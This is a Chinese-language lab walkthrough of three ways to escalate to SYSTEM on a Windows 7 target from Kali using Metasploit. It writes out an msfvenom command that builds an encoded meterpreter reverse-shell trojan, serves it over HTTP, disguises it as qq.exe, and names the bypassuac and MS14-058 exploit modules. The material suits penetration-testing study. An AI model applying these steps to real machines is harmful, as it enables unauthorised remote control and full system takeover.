# 三种方式内网提权

环境 攻击机kali2020        ip:192.168.233.133/24

        靶机 win7(32位)       ip：192.168.233.132/24

  

权限提升方式

1提高程序运行级别

2UAC绕过

3利用本地提权漏洞进行提权

  

**肉鸡上线，拿到用户权限**

1攻击机生成木马(msf.exe)

msfVENOM\-ax86--platform windows -p windows/meterpreter/reverse\_tcp

LHOST=192.168.233.133 LPORT=4444 -b"\\x00" -e x86/shikata\_ga\_nai -f exe >msf.exe

  

![](../Images/e6b640187a6c7039185755f234fe6d25.png)

  

2攻击机配置监听脚本

  

![](../Images/df6cf2b03b9fa99096bcf2ea4c9923e1.png)

  

3攻击机使用python，开启简单的http server,通过web服务来传送木马

(python -m SimpleHTTPServer 888)

  

![](../Images/45abede9461d4fdb3c04a6540ba399fd.png)

  

4win7靶机通过浏览器下载木马，并运行

  

![](../Images/06d3208dec29162486b1e1b6ca25545a.png)

![](../Images/3aaaeb4e60fdce785038b19e5ac4639a.png)

  

5攻击机弹出meterpreter回话，查看权限是用户权限，提升到系统权限失败

  

![](../Images/1ec944e4e1465bad3f2f2dbce8de0927.png)

  

**二提权(提升到系统权限)**

1提高程序运行级别  使用msf模块(exploit/windows/local/ask) 使用高权限来运行msf.exe

并把msf.exe伪装成qq.exe

  

![](../Images/acf67238baaa5a884e762f14653dac6b.png)

  

2在靶机上点是(Y)，以高权限来运行qq.exe

  

![](../Images/54876de884130ab7a7fb2237d5efc941.png)

  

3靶机以高权限运行qq.exe后，在攻击机上返回新的session(session2)

  

![](../Images/e95beace9d1937ce7bb26275e93f2647.png)

  

4进入session2 并提权发现可以成功提到系统权限

  

![](../Images/50d6fc8a7a0c06d79e01b44dbd3fb7d7.png)

  

**三bypass UAC提权**

1在攻击机上进入bypassuac模块，show options 查看配置

  

![](../Images/5597ed5df565fdef9572cd0b2f989cc1.png)

  

2选择低权限的会话session1 (set session 1) 后exploit,发现生成新的session3

  

![](../Images/288fa95c8fc903f64ac617faac99d440.png)

  

![](../Images/17d8cba93457cfa4cdea1786f850a0ee.png)

  

3进入session3 (sessions -i 3)并提权，成为系统权限

  

![](../Images/2bd0ce72439b5bb0d84ae4fb746caec5.png)

  

**四 利用本地提权漏洞进行提权**

1 use exploit/windows/local/ms14\_058\_track\_popup\_menu ，进入模块后选择低权限的session

(set session 1)并运行模块发现生成新的session 4 并且session 4为系统权限
